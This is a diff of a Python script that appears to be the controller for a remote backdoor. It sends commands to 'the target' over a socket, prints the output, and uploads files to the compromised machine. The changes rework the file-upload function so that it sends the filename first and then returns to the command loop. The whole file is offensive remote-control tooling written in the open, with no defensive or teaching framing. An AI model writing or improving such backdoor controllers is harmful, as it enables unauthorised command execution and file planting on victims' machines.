@@ -2,6 +2,8 @@ import os.path
 import socket
 from tqdm import tqdm
 
+
+
 def handle_command(client_socket):
     while True:
         # Receive commands from the user
@@ -23,10 +25,13 @@ def handle_command(client_socket):
             # For regular commands, print the output received from the target
             output = client_socket.recv(4096).decode()
             print(output)
-
-def upload_file(client_socket):
  #Upload Function
+def upload_file(client_socket):
+
+ #Input the file name
  filename = input("Input the Filename: ")
+ client_socket.send(filename.encode('utf-8'))
+
  if os.path.exists(filename):
 
      # Get the size of the file
@@ -44,6 +49,11 @@ def upload_file(client_socket):
                  bytes_sent += len(chunk)
                  pbar.update(len(chunk))
          print(f"File '{filename}' sent successfully. Total bytes sent: {bytes_sent}")
+         handle_command(client_socket)
+
+ else:
+     print("File not found!")
+     handle_command(client_socket)
 
 
 # Function to receive file from the backdoor
